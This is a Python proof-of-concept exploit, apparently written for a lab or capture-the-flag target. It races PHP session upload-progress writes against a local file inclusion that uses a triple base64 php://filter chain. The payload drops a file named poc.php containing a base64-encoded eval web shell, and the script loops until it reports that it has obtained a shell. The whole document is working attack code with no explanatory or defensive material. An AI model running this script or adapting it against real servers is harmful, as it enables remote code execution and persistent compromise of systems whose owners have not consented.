# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in imports
import io
import sys
import threading
from base64 import b64encode

# third-party imports
import requests

URL = 'http://127.0.0.1/index.php'
PHPSESSID = 'JustATest'
# Linux should be /var/lib/php/sessions/sess_PHPSESSID
SESSION_FILE = f'D:/test/phpstudy_pro/Extensions/tmp/tmp/sess_{PHPSESSID}'
PAYLOAD = "@<?php echo 'phpok';file_put_contents('poc.php',base64_decode('PD9waHAgQGV2YWwoJF9SRVFVRVNUW2FdKT8+'));?>"


def get_encode_payload():
    for i in range(36):
        junk = 'a' * i
        arg = PAYLOAD.encode() + junk.encode()
        x = b64encode(arg).decode()
        xx = b64encode(b64encode(arg)).decode()
        xxx = b64encode(b64encode(b64encode(arg))).decode()
        if '=' not in x and '=' not in xx and '=' not in xxx:
            xxx = 'upload_progress_cv' + xxx
            return xxx


def createSession(session, name):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            URL,
            data={"PHP_SESSION_UPLOAD_PROGRESS": f"{name[16:]}"},
            files={"file": ('demo.txt', f)},
            cookies={'PHPSESSID': PHPSESSID}
        )


def includeFile(session):
    while True:
        LFI = URL + f'?orange=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource={SESSION_FILE}'
        r = session.get(LFI)
        if 'phpok' in r.text:
            print("\033[32m[+] Get shell success!\033[0m")
            sys.exit(0)
        else:
            print("\033[31m[-] Try again.\033[0m")


if __name__ == "__main__":
    progress_name = get_encode_payload()
    print(progress_name)
    with requests.session() as s:
        t1 = threading.Thread(target=createSession, args=(s, progress_name,))
        t1.daemon = True
        t1.start()
        includeFile(s)
